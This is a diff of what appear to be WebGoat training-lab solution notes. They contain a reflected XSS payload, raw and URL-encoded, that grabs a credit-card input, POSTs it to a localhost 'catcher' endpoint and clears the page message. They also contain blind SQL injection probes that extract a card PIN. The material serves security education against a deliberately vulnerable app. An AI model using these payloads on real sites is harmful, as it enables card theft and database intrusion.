@@ -3,21 +3,30 @@
 
 Part2:
 <script> 
-var card_arr = document.querySelectorAll("input[name='input1']");
+var card_arr = document.getElementsByName("input1");
 var credURL="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard="+card_arr[0].value; 
 var xmlHTTP = new XMLHttpRequest(); 
 xmlHTTP.open("POST",credURL, false); 
 xmlHTTP.send(null);
+var message = document.getElementById('message');
+message.innerHTML =  "";
 </script>
+
+The encoded URL is as following:
+"
+http://localhost:8090/WebGoat/start.mvc#attack/1731484628/900?input1=123&input2=%3Cscript%3E%20%0Avar%20card_arr%20%3D%20document.getElementsByName(%22input1%22)%3B%0Avar%20credURL%3D%22http%3A%2F%2Flocalhost%3A8090%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26stolenCreditCard%3D%22%2Bcard_arr%5B0%5D.value%3B%20%0Avar%20xmlHTTP%20%3D%20new%20XMLHttpRequest()%3B%20%0AxmlHTTP.open(%22POST%22%2CcredURL%2C%20false)%3B%20%0AxmlHTTP.send(null)%3B%0Avar%20div%20%3D%20document.getElementById(%27message%27)%3B%0Adiv.innerHTML%20%3D%20%20%22%22%3B%0A%3C%2Fscript%3E
+"
 
 The decoded URL is as following:
 "
 http://localhost:8090/WebGoat/start.mvc#attack/1731484628/900?input1=123&input2=<script>
-	var card_arr = document.querySelectorAll("input[name='input1']");
-	var credURL="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard="+card_arr[0].value;
-	var xmlHTTP = new XMLHttpRequest();
-	xmlHTTP.open("POST",credURL, false);
-	xmlHTTP.send(null);
+var card_arr = document.getElementsByName("input1");
+var credURL="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard="+card_arr[0].value; 
+var xmlHTTP = new XMLHttpRequest(); 
+xmlHTTP.open("POST",credURL, false); 
+xmlHTTP.send(null);
+var message = document.getElementById('message');
+message.innerHTML =  "";
 </script>
 "
 
@@ -25,3 +34,5 @@ http://localhost:8090/WebGoat/start.mvc#attack/1731484628/900?input1=123&input2=
 Part8:
 101 AND ((select pin from credit where cc_number = 1234123412341234) < <Nnumber1>)
 101 AND ((select pin from credit where cc_number = 1234123412341234) > <Nnumber2>)
+After finding 4862, check by the command:
+101 AND ((select pin from credit where cc_number = 1234123412341234) = 4862)
